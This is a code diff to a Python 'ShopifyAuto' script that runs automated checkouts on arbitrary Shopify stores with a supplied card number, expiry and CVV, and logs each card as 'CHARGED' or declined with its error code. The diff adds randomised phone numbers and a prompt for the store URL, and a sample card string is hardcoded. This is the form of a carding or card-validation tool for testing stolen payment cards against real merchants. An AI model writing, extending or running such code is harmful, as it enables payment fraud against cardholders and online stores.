@@ -13,8 +13,7 @@ class ShopifyAuto:
         self.cart_url = f"{self.base_url}/cart"
         self.tax = '0'
         self.email = Utils().generate_random_string(length=15) + "@gmail.com"
-        # self.phone = '+1850' + Utils().generate_random_digits(length=7)
-        self.phone = "+19174034039"
+        self.phone = '+19174' + Utils().generate_random_digits(length=6)
 
     def start(self, cc):
         self.product_counter = -1
@@ -233,7 +232,7 @@ class ShopifyAuto:
                 if 'discounts' in response.text:
                     self.submit_receipt()
                 elif 'Error' in response.text:
-                    log_error(8, f"{response.json()['data']['receipt']['processingError']['code']}", cc, end='\n')
+                    log_error(8, f"{self.currency} {float(self.amount) + float(self.cheapest_delivery['amount'] + float(self.tax))} {response.json()['data']['receipt']['processingError']['code']}", cc, end='\n')
                     return False
                 elif 'confirmationPage' in response.text:
                     log_success(8, f"{self.currency} {float(self.amount) + float(self.cheapest_delivery['amount'] + float(self.tax))} CHARGED", cc, end='\n')
@@ -246,6 +245,6 @@ class ShopifyAuto:
             return False
 
 if __name__ == "__main__":
-    shopify = ShopifyAuto('mrbeast.store')
+    store = ShopifyAuto(input('Enter store url: '))
     cc = '4347692046701023|12|2026|123'.split('|')
-    shopify.start(cc)
+    store.start(cc)
